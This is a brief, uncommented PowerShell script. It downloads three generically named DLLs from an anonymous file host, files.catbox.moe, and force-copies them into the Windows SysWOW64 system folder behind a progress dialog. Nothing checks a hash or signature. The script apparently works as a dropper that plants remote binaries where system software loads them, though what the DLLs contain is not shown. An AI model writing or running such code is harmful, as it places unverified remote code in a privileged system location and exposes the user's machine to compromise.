Add-Type -AssemblyName System.Windows.Forms

$downloads = @(
    @{ Name = "file1.dll"; Url = "https://files.catbox.moe/77pg84.dll" },
    @{ Name = "file2.dll"; Url = "https://files.catbox.moe/enco8e.dll" },
    @{ Name = "file3.dll"; Url = "https://files.catbox.moe/jmp14d.dll" }
)

$webclient = New-Object System.Net.WebClient

$progressForm = New-Object Windows.Forms.Form
$progressForm.Text = "Downloading Files..."
$progressForm.Width = 400
$progressBar = New-Object Windows.Forms.ProgressBar
$progressBar.Style = 'Continuous'
$progressBar.Minimum = 0
$progressBar.Maximum = 100
$progressBar.Dock = 'Fill'
$progressForm.Controls.Add($progressBar)

$webclient.DownloadProgressChanged += {
    param($sender, $e)
    $progressBar.Value = $e.ProgressPercentage
}

$webclient.DownloadFileCompleted += {
    param($sender, $e)
    $progressForm.Close()
}

$destDir = "$env:windir\SysWOW64"

foreach ($file in $downloads) {
    $local = Join-Path -Path $env:TEMP -ChildPath $file.Name
    $webclient.DownloadFileAsync($file.Url, $local)

    $progressForm.ShowDialog()

    Copy-Item $local -Destination (Join-Path $destDir $file.Name) -Force
}
